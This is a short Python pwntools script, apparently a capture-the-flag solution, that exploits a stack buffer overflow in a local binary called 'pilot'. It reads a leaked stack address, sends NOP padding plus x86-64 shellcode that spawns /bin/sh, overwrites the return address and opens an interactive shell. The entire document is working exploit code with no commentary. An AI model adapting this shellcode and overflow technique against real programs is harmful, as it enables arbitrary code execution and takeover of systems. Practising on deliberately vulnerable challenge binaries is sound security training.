from pwn import *

p = process('./pilot')

buffer = 40
shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
buffer_nops = b'\x90'*4

padding = b'A'* (40 - len(shellcode) - len(buffer_nops))

p.readuntil(b"[*]Location:")
address = p.readline()

address_parts = address.partition(b":")[::1]
address_parts_two = address_parts[0].partition(b"\n")[::1]

address_hex = int(address_parts_two[0],16)
print(hex(address_hex))

p.readuntil(b'[*]Command:')
p.send(buffer_nops + shellcode + padding + p64(address_hex))

p.interactive()
